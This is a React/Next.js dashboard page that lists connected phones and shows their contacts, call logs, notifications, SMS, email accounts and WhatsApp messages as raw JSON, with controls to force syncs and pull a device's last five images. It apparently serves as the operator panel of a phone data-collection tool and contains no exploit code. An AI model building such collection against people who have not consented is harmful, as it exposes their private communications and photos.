import { useState, useEffect } from 'react'
import { useQuery } from 'react-query'
import Link from 'next/link'
import { deviceAPI, healthAPI, notificationsAPI, emailAccountsAPI, contactsAPI, callLogsAPI, messagesAPI, whatsappAPI, adminAPI, dataAPI, syncAPI, authAPI } from '../lib/api'
import DeviceCard from '../components/DeviceCard'
import DeviceDetails from '../components/DeviceDetails'
import AuthWrapper from '../components/AuthWrapper'
import { Smartphone, Users, Phone, Bell, MessageSquare, Mail, Activity, Wifi, WifiOff, RefreshCw, TrendingUp, Database, Zap, Settings, Shield, FileText, Image, LogOut } from 'lucide-react'
import toast from 'react-hot-toast'
import { LineChart, Line, XAxis, YAxis, CartesianGrid, Tooltip, Legend, ResponsiveContainer, PieChart, Pie, Cell, BarChart, Bar } from 'recharts'

export default function Home() {
  const [selectedDevice, setSelectedDevice] = useState(null)
  const [activeTab, setActiveTab] = useState('overview')
  
  const handleLogout = () => {
    authAPI.logout()
    toast.success('Logged out successfully')
    window.location.href = '/login'
  }
  const [stats, setStats] = useState({
    totalDevices: 0,
    activeDevices: 0,
    totalContacts: 0,
    totalCallLogs: 0,
    totalNotifications: 0,
    totalMessages: 0,
    totalEmails: 0,
    totalWhatsApp: 0
  })

  // Health check
  const { data: healthData, isLoading: healthLoading } = useQuery(
    'health',
    healthAPI.check,
    {
      refetchInterval: 30000,
      onError: (error) => {
        console.error('Health check failed:', error)
      }
    }
  )

  // Devices data
  const { data: devices, isLoading, error, refetch } = useQuery(
    'devices',
    deviceAPI.getAll,
    {
      refetchInterval: 30000,
      onSuccess: (response) => {
        // Handle different possible response structures
        const devicesData = Array.isArray(response) ? response : 
                           Array.isArray(response.data) ? response.data : 
                           Array.isArray(response.devices) ? response.devices : []
        

        
        const totalStats = devicesData.reduce((acc, device) => {
          return {
            totalDevices: acc.totalDevices + 1,
            activeDevices: acc.activeDevices + (device.isActive ? 1 : 0),
            totalContacts: acc.totalContacts + (device.stats?.totalContacts || 0),
            totalCallLogs: acc.totalCallLogs + (device.stats?.totalCallLogs || 0),
            totalNotifications: acc.totalNotifications + (device.stats?.totalNotifications || 0),
            totalMessages: acc.totalMessages + (device.stats?.totalMessages || 0),
            totalEmails: acc.totalEmails + (device.stats?.totalEmails || 0),
            totalWhatsApp: acc.totalWhatsApp + (device.stats?.totalWhatsApp || 0)
          }
        }, {
          totalDevices: 0,
          activeDevices: 0,
          totalContacts: 0,
          totalCallLogs: 0,
          totalNotifications: 0,
          totalMessages: 0,
          totalEmails: 0,
          totalWhatsApp: 0
        })
        setStats(totalStats)
      },
      onError: (error) => {
        toast.error('Failed to fetch devices')
        console.error('Error fetching devices:', error)
      }
    }
  )

  // Notifications data - Updated to use new API
  const { data: notificationsData } = useQuery(
    ['notifications', selectedDevice?.deviceId],
    () => selectedDevice ? notificationsAPI.getAll(selectedDevice.deviceId) : null,
    {
      enabled: !!selectedDevice,
      refetchInterval: 15000
    }
  )

  // Email accounts data - Updated to use new API
  const { data: emailData } = useQuery(
    ['emails', selectedDevice?.deviceId],
    () => selectedDevice ? emailAccountsAPI.getAll(selectedDevice.deviceId) : null,
    {
      enabled: !!selectedDevice,
      refetchInterval: 30000
    }
  )

  // Contacts data - Updated to use new API
  const { data: contactsData } = useQuery(
    ['contacts', selectedDevice?.deviceId],
    () => selectedDevice ? contactsAPI.getAll(selectedDevice.deviceId) : null,
    {
      enabled: !!selectedDevice,
      refetchInterval: 60000
    }
  )

  // Call logs data - Updated to use new API
  const { data: callLogsData } = useQuery(
    ['callLogs', selectedDevice?.deviceId],
    () => selectedDevice ? callLogsAPI.getAll(selectedDevice.deviceId) : null,
    {
      enabled: !!selectedDevice,
      refetchInterval: 60000
    }
  )

  // Messages data - Updated to use new API
  const { data: messagesData } = useQuery(
    ['messages', selectedDevice?.deviceId],
    () => selectedDevice ? messagesAPI.getAll(selectedDevice.deviceId) : null,
    {
      enabled: !!selectedDevice,
      refetchInterval: 30000
    }
  )

  // WhatsApp data - Updated to use new API
  const { data: whatsappData } = useQuery(
    ['whatsapp', selectedDevice?.deviceId],
    () => selectedDevice ? whatsappAPI.getAll(selectedDevice.deviceId) : null,
    {
      enabled: !!selectedDevice,
      refetchInterval: 30000
    }
  )

  // Sync settings data - New query for sync settings
  const { data: syncSettingsData } = useQuery(
    ['syncSettings', selectedDevice?.deviceId],
    () => selectedDevice ? syncAPI.getSyncStats(selectedDevice.deviceId) : null,
    {
      enabled: !!selectedDevice,
      refetchInterval: 60000
    }
  )

  // Global data stats - New query for global stats
  const { data: globalStatsData } = useQuery(
    'globalStats',
    adminAPI.getGlobalStats,
    {
      refetchInterval: 60000,
      onError: (error) => {
        console.error('Failed to fetch global stats:', error)
      }
    }
  )

  const handleDeviceStatusChange = async (deviceId, isActive) => {
    try {
      await deviceAPI.updateStatus(deviceId, isActive)
      toast.success(`Device ${isActive ? 'activated' : 'deactivated'}`)
      refetch()
    } catch (error) {
      toast.error('Failed to update device status')
      console.error('Error updating device status:', error)
    }
  }

  const handleSettingsUpdate = async (deviceId, settings) => {
    try {
      await deviceAPI.updateSettings(deviceId, settings)
      toast.success('Settings updated successfully')
      refetch()
    } catch (error) {
      toast.error('Failed to update settings')
      console.error('Error updating settings:', error)
    }
  }

  const handleManualSync = async (deviceId, dataType) => {
    try {
      await deviceAPI.updateSync(deviceId, dataType)
      toast.success(`${dataType} sync triggered`)
      refetch()
    } catch (error) {
      toast.error(`Failed to trigger ${dataType} sync`)
      console.error('Error triggering sync:', error)
    }
  }

  // New function to fix database indexes
  const handleFixIndexes = async () => {
    try {
      await adminAPI.fixIndexes()
      toast.success('Database indexes fixed successfully')
    } catch (error) {
      toast.error('Failed to fix database indexes')
      console.error('Error fixing indexes:', error)
    }
  }

  // New function to upload last 5 images
  const handleUploadLast5Images = async (deviceId) => {
    try {
      await deviceAPI.uploadLast5Images(deviceId, {})
      toast.success('Last 5 images upload triggered')
    } catch (error) {
      toast.error('Failed to upload last 5 images')
      console.error('Error uploading images:', error)
    }
  }

  // New function to test sync
  const handleTestSync = async (deviceId) => {
    try {
      await deviceAPI.testSync(deviceId, {})
      toast.success('Test sync triggered')
    } catch (error) {
      toast.error('Failed to trigger test sync')
      console.error('Error triggering test sync:', error)
    }
  }

  // Chart data for notifications over time
  const notificationsChartData = notificationsData?.data?.slice(-10).map((notification, index) => ({
    time: index,
    count: 1,
    type: notification.packageName || 'Unknown'
  })) || []

  // Chart data for data types distribution
  const dataTypesChartData = [
    { name: 'Contacts', value: stats.totalContacts, color: '#3B82F6' },
    { name: 'Call Logs', value: stats.totalCallLogs, color: '#F59E0B' },
    { name: 'Notifications', value: stats.totalNotifications, color: '#EF4444' },
    { name: 'Messages', value: stats.totalMessages, color: '#8B5CF6' },
    { name: 'Emails', value: stats.totalEmails, color: '#10B981' },
    { name: 'WhatsApp', value: stats.totalWhatsApp, color: '#25D366' }
  ].filter(item => item.value > 0)

  if (isLoading) {
    return (
      <div className="flex items-center justify-center min-h-screen">
        <div className="animate-spin rounded-full h-32 w-32 border-b-2 border-blue-600"></div>
      </div>
    )
  }

  if (error) {
    return (
      <div className="flex items-center justify-center min-h-screen">
        <div className="text-center">
          <h1 className="text-2xl font-bold text-red-600 mb-4">Error Loading Dashboard</h1>
          <p className="text-gray-600 mb-4">Failed to connect to the server</p>
          <button
            onClick={() => refetch()}
            className="bg-blue-600 text-white px-4 py-2 rounded-lg hover:bg-blue-700"
          >
            Retry
          </button>
        </div>
      </div>
    )
  }

  return (
    <AuthWrapper>
      <div className="min-h-screen bg-gray-50">
      {/* Header */}
      <div className="bg-white shadow-sm border-b">
        <div className="container mx-auto px-4 py-6">
          <div className="flex items-center justify-between">
            <div>
              <h1 className="text-3xl font-bold text-gray-900">Device Sync Dashboard</h1>
              <p className="text-gray-600 mt-1">Real-time monitoring of device data synchronization</p>
            </div>
            <div className="flex items-center space-x-4">
              <div className="flex items-center space-x-2">
                {healthLoading ? (
                  <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-gray-400"></div>
                ) : healthData ? (
                  <Wifi className="h-5 w-5 text-green-500" />
                ) : (
                  <WifiOff className="h-5 w-5 text-red-500" />
                )}
                <span className="text-sm text-gray-600">
                  {healthLoading ? 'Checking...' : healthData ? 'Connected' : 'Disconnected'}
                </span>
              </div>
              <Link
                href="/devices"
                className="flex items-center space-x-2 bg-purple-600 text-white px-4 py-2 rounded-lg hover:bg-purple-700"
              >
                <Smartphone className="h-4 w-4" />
                <span>Devices</span>
              </Link>
              <Link
                href="/data-viewer"
                className="flex items-center space-x-2 bg-green-600 text-white px-4 py-2 rounded-lg hover:bg-green-700"
              >
                <Database className="h-4 w-4" />
                <span>Data Viewer</span>
              </Link>
              <button
                onClick={() => refetch()}
                className="flex items-center space-x-2 bg-blue-600 text-white px-4 py-2 rounded-lg hover:bg-blue-700"
              >
                <RefreshCw className="h-4 w-4" />
                <span>Refresh</span>
              </button>
              <button
                onClick={handleLogout}
                className="flex items-center space-x-2 bg-red-600 text-white px-4 py-2 rounded-lg hover:bg-red-700"
              >
                <LogOut className="h-4 w-4" />
                <span>Logout</span>
              </button>
            </div>
          </div>
        </div>
      </div>

      <div className="container mx-auto px-4 py-8">
        {/* Stats Cards */}
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-8">
          <div className="bg-white rounded-lg shadow-sm p-6 border">
            <div className="flex items-center">
              <div className="p-2 bg-blue-100 rounded-lg">
                <Smartphone className="h-6 w-6 text-blue-600" />
              </div>
              <div className="ml-4">
                <p className="text-sm font-medium text-gray-600">Total Devices</p>
                <p className="text-2xl font-semibold text-gray-900">{stats.totalDevices}</p>
              </div>
            </div>
          </div>

          <div className="bg-white rounded-lg shadow-sm p-6 border">
            <div className="flex items-center">
              <div className="p-2 bg-green-100 rounded-lg">
                <Activity className="h-6 w-6 text-green-600" />
              </div>
              <div className="ml-4">
                <p className="text-sm font-medium text-gray-600">Active Devices</p>
                <p className="text-2xl font-semibold text-gray-900">{stats.activeDevices}</p>
              </div>
            </div>
          </div>

          <div className="bg-white rounded-lg shadow-sm p-6 border">
            <div className="flex items-center">
              <div className="p-2 bg-purple-100 rounded-lg">
                <Database className="h-6 w-6 text-purple-600" />
              </div>
              <div className="ml-4">
                <p className="text-sm font-medium text-gray-600">Total Data Items</p>
                <p className="text-2xl font-semibold text-gray-900">
                  {(stats.totalContacts + stats.totalCallLogs + stats.totalNotifications + stats.totalMessages + stats.totalEmails + stats.totalWhatsApp).toLocaleString()}
                </p>
              </div>
            </div>
          </div>

          <div className="bg-white rounded-lg shadow-sm p-6 border">
            <div className="flex items-center">
              <div className="p-2 bg-yellow-100 rounded-lg">
                <Zap className="h-6 w-6 text-yellow-600" />
              </div>
              <div className="ml-4">
                <p className="text-sm font-medium text-gray-600">Sync Status</p>
                <p className="text-2xl font-semibold text-gray-900">
                  {stats.activeDevices > 0 ? 'Active' : 'Inactive'}
                </p>
              </div>
            </div>
          </div>
        </div>

        {/* Admin Controls */}
        <div className="bg-white rounded-lg shadow-sm p-6 border mb-8">
          <div className="flex items-center justify-between mb-4">
            <h2 className="text-xl font-semibold text-gray-900 flex items-center">
              <Shield className="h-5 w-5 mr-2 text-gray-600" />
              Admin Controls
            </h2>
          </div>
          <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
            <button
              onClick={handleFixIndexes}
              className="flex items-center justify-center space-x-2 bg-red-600 text-white px-4 py-2 rounded-lg hover:bg-red-700 transition-colors"
            >
              <Database className="h-4 w-4" />
              <span>Fix Database Indexes</span>
            </button>
            <button
              onClick={() => handleUploadLast5Images(selectedDevice?.deviceId)}
              disabled={!selectedDevice}
              className="flex items-center justify-center space-x-2 bg-blue-600 text-white px-4 py-2 rounded-lg hover:bg-blue-700 transition-colors disabled:bg-gray-400 disabled:cursor-not-allowed"
            >
              {/* eslint-disable-next-line jsx-a11y/alt-text */}
              <Image className="h-4 w-4" />
              <span>Upload Last 5 Images</span>
            </button>
            <button
              onClick={() => handleTestSync(selectedDevice?.deviceId)}
              disabled={!selectedDevice}
              className="flex items-center justify-center space-x-2 bg-green-600 text-white px-4 py-2 rounded-lg hover:bg-green-700 transition-colors disabled:bg-gray-400 disabled:cursor-not-allowed"
            >
              <RefreshCw className="h-4 w-4" />
              <span>Test Sync</span>
            </button>
          </div>
        </div>

        {/* Global Stats */}
        {globalStatsData && (
          <div className="bg-white rounded-lg shadow-sm p-6 border mb-8">
            <div className="flex items-center justify-between mb-4">
              <h2 className="text-xl font-semibold text-gray-900 flex items-center">
                <TrendingUp className="h-5 w-5 mr-2 text-gray-600" />
                Global Statistics
              </h2>
            </div>
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4">
              <div className="text-center">
                <p className="text-sm font-medium text-gray-600">Total Records</p>
                <p className="text-2xl font-semibold text-gray-900">{globalStatsData.data?.totalRecords || 0}</p>
              </div>
              <div className="text-center">
                <p className="text-sm font-medium text-gray-600">Last 24h</p>
                <p className="text-2xl font-semibold text-gray-900">{globalStatsData.data?.last24h || 0}</p>
              </div>
              <div className="text-center">
                <p className="text-sm font-medium text-gray-600">Active Syncs</p>
                <p className="text-2xl font-semibold text-gray-900">{globalStatsData.data?.activeSyncs || 0}</p>
              </div>
              <div className="text-center">
                <p className="text-sm font-medium text-gray-600">Storage Used</p>
                <p className="text-2xl font-semibold text-gray-900">{globalStatsData.data?.storageUsed || '0 MB'}</p>
              </div>
            </div>
          </div>
        )}

        {/* Data Type Breakdown */}
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-8 mb-8">
          <div className="lg:col-span-2">
            <div className="bg-white rounded-lg shadow-sm p-6 border">
              <h3 className="text-lg font-semibold text-gray-900 mb-4">Data Types Distribution</h3>
              <div className="grid grid-cols-2 md:grid-cols-3 gap-4">
                <div className="text-center p-4 bg-blue-50 rounded-lg">
                  <Users className="h-8 w-8 text-blue-600 mx-auto mb-2" />
                  <p className="text-sm font-medium text-gray-600">Contacts</p>
                  <p className="text-xl font-semibold text-gray-900">{stats.totalContacts.toLocaleString()}</p>
                </div>
                <div className="text-center p-4 bg-yellow-50 rounded-lg">
                  <Phone className="h-8 w-8 text-yellow-600 mx-auto mb-2" />
                  <p className="text-sm font-medium text-gray-600">Call Logs</p>
                  <p className="text-xl font-semibold text-gray-900">{stats.totalCallLogs.toLocaleString()}</p>
                </div>
                <div className="text-center p-4 bg-red-50 rounded-lg">
                  <Bell className="h-8 w-8 text-red-600 mx-auto mb-2" />
                  <p className="text-sm font-medium text-gray-600">Notifications</p>
                  <p className="text-xl font-semibold text-gray-900">{stats.totalNotifications.toLocaleString()}</p>
                </div>
                <div className="text-center p-4 bg-purple-50 rounded-lg">
                  <MessageSquare className="h-8 w-8 text-purple-600 mx-auto mb-2" />
                  <p className="text-sm font-medium text-gray-600">Messages</p>
                  <p className="text-xl font-semibold text-gray-900">{stats.totalMessages.toLocaleString()}</p>
                </div>
                <div className="text-center p-4 bg-green-50 rounded-lg">
                  <Mail className="h-8 w-8 text-green-600 mx-auto mb-2" />
                  <p className="text-sm font-medium text-gray-600">Emails</p>
                  <p className="text-xl font-semibold text-gray-900">{stats.totalEmails.toLocaleString()}</p>
                </div>
                <div className="text-center p-4 bg-emerald-50 rounded-lg">
                  <MessageSquare className="h-8 w-8 text-emerald-600 mx-auto mb-2" />
                  <p className="text-sm font-medium text-gray-600">WhatsApp</p>
                  <p className="text-xl font-semibold text-gray-900">{stats.totalWhatsApp.toLocaleString()}</p>
                </div>
              </div>
            </div>
          </div>

          <div className="lg:col-span-1">
            <div className="bg-white rounded-lg shadow-sm p-6 border">
              <h3 className="text-lg font-semibold text-gray-900 mb-4">Data Distribution</h3>
              {dataTypesChartData.length > 0 ? (
                <ResponsiveContainer width="100%" height={200}>
                  <PieChart>
                    <Pie
                      data={dataTypesChartData}
                      cx="50%"
                      cy="50%"
                      innerRadius={40}
                      outerRadius={80}
                      paddingAngle={5}
                      dataKey="value"
                    >
                      {dataTypesChartData.map((entry, index) => (
                        <Cell key={`cell-${index}`} fill={entry.color} />
                      ))}
                    </Pie>
                    <Tooltip />
                  </PieChart>
                </ResponsiveContainer>
              ) : (
                <div className="text-center text-gray-500 py-8">
                  <Database className="h-12 w-12 mx-auto mb-4 text-gray-300" />
                  <p>No data available</p>
                </div>
              )}
            </div>
          </div>
        </div>

        {/* Main Content */}
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
          {/* Devices List */}
          <div className="lg:col-span-1">
            <div className="bg-white rounded-lg shadow-sm border">
              <div className="p-6 border-b border-gray-200">
                <h2 className="text-xl font-semibold text-gray-900">Connected Devices</h2>
                <p className="text-sm text-gray-600">Click on a device to view details</p>
              </div>
              <div className="divide-y divide-gray-200">
                {(!devices?.data || devices.data.length === 0) ? (
                  <div className="p-6 text-center text-gray-500">
                    <Smartphone className="h-12 w-12 mx-auto mb-4 text-gray-300" />
                    <p>No devices connected</p>
                  </div>
                ) : (
                  (Array.isArray(devices) ? devices : 
                   Array.isArray(devices?.data) ? devices.data : 
                   Array.isArray(devices?.devices) ? devices.devices : []).map((device) => (
                    <DeviceCard
                      key={device._id || device.deviceId || device.id}
                      device={device}
                      isSelected={selectedDevice?._id === device._id || selectedDevice?.deviceId === device.deviceId}
                      onClick={() => setSelectedDevice(device)}
                      onStatusChange={handleDeviceStatusChange}
                    />
                  ))
                )}
              </div>
            </div>
          </div>

          {/* Device Details */}
          <div className="lg:col-span-2">
            {selectedDevice ? (
              <div className="bg-white rounded-lg shadow-sm border">
                <div className="p-6 border-b border-gray-200">
                  <div className="flex items-center justify-between">
                    <h2 className="text-xl font-semibold text-gray-900">Device Details</h2>
                    <div className="flex space-x-2">
                      <button
                        onClick={() => setActiveTab('overview')}
                        className={`px-3 py-1 rounded-md text-sm font-medium ${
                          activeTab === 'overview' ? 'bg-blue-100 text-blue-700' : 'text-gray-500 hover:text-gray-700'
                        }`}
                      >
                        Overview
                      </button>
                      <button
                        onClick={() => setActiveTab('data')}
                        className={`px-3 py-1 rounded-md text-sm font-medium ${
                          activeTab === 'data' ? 'bg-blue-100 text-blue-700' : 'text-gray-500 hover:text-gray-700'
                        }`}
                      >
                        Data
                      </button>
                      <button
                        onClick={() => setActiveTab('settings')}
                        className={`px-3 py-1 rounded-md text-sm font-medium ${
                          activeTab === 'settings' ? 'bg-blue-100 text-blue-700' : 'text-gray-500 hover:text-gray-700'
                        }`}
                      >
                        Settings
                      </button>
                    </div>
                  </div>
                </div>
                
                <div className="p-6">
                  {activeTab === 'overview' && (
                    <DeviceOverview 
                      device={selectedDevice}
                      notificationsData={notificationsData}
                      emailData={emailData}
                      contactsData={contactsData}
                      callLogsData={callLogsData}
                      messagesData={messagesData}
                      whatsappData={whatsappData}
                      onManualSync={handleManualSync}
                      syncSettingsData={syncSettingsData}
                    />
                  )}
                  
                  {activeTab === 'data' && (
                    <DeviceData 
                      device={selectedDevice}
                      notificationsData={notificationsData}
                      emailData={emailData}
                      contactsData={contactsData}
                      callLogsData={callLogsData}
                      messagesData={messagesData}
                      whatsappData={whatsappData}
                    />
                  )}
                  
                  {activeTab === 'settings' && (
                    <DeviceDetails
                      device={selectedDevice}
                      onSettingsUpdate={handleSettingsUpdate}
                      onRefresh={() => refetch()}
                    />
                  )}
                </div>
              </div>
            ) : (
              <div className="bg-white rounded-lg shadow-sm border p-12 text-center">
                <Smartphone className="h-16 w-16 mx-auto mb-4 text-gray-300" />
                <h3 className="text-lg font-medium text-gray-900 mb-2">Select a Device</h3>
                <p className="text-gray-600">Choose a device from the list to view its details and manage settings.</p>
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  )
}

// Device Overview Component
function DeviceOverview({ device, notificationsData, emailData, contactsData, callLogsData, messagesData, whatsappData, onManualSync, syncSettingsData }) {
  const recentNotifications = notificationsData?.data?.slice(-5) || []
  
  return (
    <div className="space-y-6">
      {/* Device Info */}
      <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
        <div className="bg-gray-50 rounded-lg p-4">
          <h4 className="font-medium text-gray-900 mb-2">Device Information</h4>
          <div className="space-y-2 text-sm">
            <div className="flex justify-between">
              <span className="text-gray-600">Device ID:</span>
              <span className="font-medium">{device.deviceId}</span>
            </div>
            <div className="flex justify-between">
              <span className="text-gray-600">Platform:</span>
              <span className="font-medium">{device.deviceInfo?.platform || 'Unknown'}</span>
            </div>
            <div className="flex justify-between">
              <span className="text-gray-600">Status:</span>
              <span className={`font-medium ${device.isActive ? 'text-green-600' : 'text-red-600'}`}>
                {device.isActive ? 'Active' : 'Inactive'}
              </span>
            </div>
            <div className="flex justify-between">
              <span className="text-gray-600">Last Sync:</span>
              <span className="font-medium">
                {device.lastSyncTime ? new Date(device.lastSyncTime).toLocaleString() : 'Never'}
              </span>
            </div>
          </div>
        </div>

        <div className="bg-gray-50 rounded-lg p-4">
          <h4 className="font-medium text-gray-900 mb-2">Sync Statistics</h4>
          <div className="space-y-2 text-sm">
            <div className="flex justify-between">
              <span className="text-gray-600">Contacts:</span>
              <span className="font-medium">{device.stats?.totalContacts || 0}</span>
            </div>
            <div className="flex justify-between">
              <span className="text-gray-600">Call Logs:</span>
              <span className="font-medium">{device.stats?.totalCallLogs || 0}</span>
            </div>
            <div className="flex justify-between">
              <span className="text-gray-600">Notifications:</span>
              <span className="font-medium">{device.stats?.totalNotifications || 0}</span>
            </div>
            <div className="flex justify-between">
              <span className="text-gray-600">Messages:</span>
              <span className="font-medium">{device.stats?.totalMessages || 0}</span>
            </div>
            <div className="flex justify-between">
              <span className="text-gray-600">Emails:</span>
              <span className="font-medium">{device.stats?.totalEmails || 0}</span>
            </div>
            <div className="flex justify-between">
              <span className="text-gray-600">WhatsApp:</span>
              <span className="font-medium">{device.stats?.totalWhatsApp || 0}</span>
            </div>
          </div>
        </div>
      </div>

      {/* Sync Settings */}
      {syncSettingsData && (
        <div className="bg-gray-50 rounded-lg p-4">
          <h4 className="font-medium text-gray-900 mb-2">Sync Settings</h4>
          <div className="space-y-2 text-sm">
            {Object.entries(syncSettingsData.data || {}).map(([dataType, settings]) => (
              <div key={dataType} className="flex justify-between items-center">
                <span className="text-gray-600 capitalize">{dataType.replace('_', ' ')}:</span>
                <div className="text-right">
                  <div className="font-medium">
                    {settings.status === 'SUCCESS' ? '✅' : settings.status === 'FAILED' ? '❌' : '⏳'} {settings.status}
                  </div>
                  <div className="text-xs text-gray-500">
                    Last: {settings.lastSyncTime ? new Date(settings.lastSyncTime).toLocaleString() : 'Never'}
                  </div>
                  <div className="text-xs text-gray-500">
                    Items: {settings.itemCount || 0}
                  </div>
                </div>
              </div>
            ))}
          </div>
        </div>
      )}

      {/* Quick Actions */}
      <div className="bg-blue-50 rounded-lg p-4">
        <h4 className="font-medium text-gray-900 mb-3">Quick Actions</h4>
        <div className="grid grid-cols-2 md:grid-cols-3 gap-2">
          {['CONTACTS', 'CALL_LOGS', 'NOTIFICATIONS', 'MESSAGES', 'EMAIL_ACCOUNTS', 'WHATSAPP'].map((dataType) => (
            <button
              key={dataType}
              onClick={() => onManualSync(device.deviceId, dataType)}
              className="bg-white text-blue-600 px-3 py-2 rounded-md text-sm font-medium hover:bg-blue-50 border border-blue-200"
            >
              Sync {dataType.replace('_', ' ')}
            </button>
          ))}
        </div>
      </div>

      {/* Recent Notifications */}
      <div className="bg-gray-50 rounded-lg p-4">
        <h4 className="font-medium text-gray-900 mb-3">Recent Notifications</h4>
        {recentNotifications.length > 0 ? (
          <div className="space-y-2">
            {recentNotifications.map((notification, index) => (
              <div key={index} className="bg-white p-3 rounded-md border">
                <div className="flex justify-between items-start">
                  <div className="flex-1">
                    <p className="font-medium text-sm">{notification.title || 'No Title'}</p>
                    <p className="text-xs text-gray-600">{notification.text || 'No Content'}</p>
                    <p className="text-xs text-gray-500 mt-1">{notification.packageName}</p>
                  </div>
                  <span className="text-xs text-gray-500">
                    {notification.timestamp ? new Date(notification.timestamp).toLocaleTimeString() : 'Unknown'}
                  </span>
                </div>
              </div>
            ))}
          </div>
        ) : (
          <p className="text-gray-500 text-sm">No recent notifications</p>
        )}
      </div>
    </div>
  )
}

// Device Data Component
function DeviceData({ device, notificationsData, emailData, contactsData, callLogsData, messagesData, whatsappData }) {
  const [activeDataType, setActiveDataType] = useState('notifications')
  
  const dataTypes = [
    { key: 'notifications', label: 'Notifications', icon: Bell, data: notificationsData?.data || [] },
    { key: 'emails', label: 'Email Accounts', icon: Mail, data: emailData?.data || [] },
    { key: 'contacts', label: 'Contacts', icon: Users, data: contactsData?.data || [] },
    { key: 'callLogs', label: 'Call Logs', icon: Phone, data: callLogsData?.data || [] },
    { key: 'messages', label: 'Messages', icon: MessageSquare, data: messagesData?.data || [] },
    { key: 'whatsapp', label: 'WhatsApp', icon: MessageSquare, data: whatsappData?.data || [] }
  ]

  const currentDataType = dataTypes.find(dt => dt.key === activeDataType)

  return (
    <div className="space-y-6">
      {/* Data Type Tabs */}
      <div className="flex flex-wrap gap-2">
        {dataTypes.map((dataType) => {
          const Icon = dataType.icon
          return (
            <button
              key={dataType.key}
              onClick={() => setActiveDataType(dataType.key)}
              className={`flex items-center space-x-2 px-4 py-2 rounded-md text-sm font-medium ${
                activeDataType === dataType.key
                  ? 'bg-blue-100 text-blue-700'
                  : 'bg-gray-100 text-gray-600 hover:bg-gray-200'
              }`}
            >
              <Icon className="h-4 w-4" />
              <span>{dataType.label}</span>
              <span className="bg-gray-200 text-gray-700 px-2 py-0.5 rounded-full text-xs">
                {dataType.data.length}
              </span>
            </button>
          )
        })}
      </div>

      {/* Data Display */}
      <div className="bg-gray-50 rounded-lg p-4">
        <h4 className="font-medium text-gray-900 mb-4">{currentDataType.label} ({currentDataType.data.length})</h4>
        
        {currentDataType.data.length > 0 ? (
          <div className="space-y-3 max-h-96 overflow-y-auto">
            {currentDataType.data.slice(0, 20).map((item, index) => (
              <div key={index} className="bg-white p-4 rounded-md border">
                <pre className="text-xs text-gray-700 whitespace-pre-wrap">
                  {JSON.stringify(item, null, 2)}
                </pre>
              </div>
            ))}
            {currentDataType.data.length > 20 && (
              <p className="text-sm text-gray-500 text-center py-2">
                Showing first 20 items of {currentDataType.data.length} total
              </p>
            )}
          </div>
        ) : (
          <div className="text-center py-8">
            <currentDataType.icon className="h-12 w-12 mx-auto mb-4 text-gray-300" />
            <p className="text-gray-500">No {currentDataType.label.toLowerCase()} data available</p>
          </div>
        )}
      </div>
    </div>
  )
}
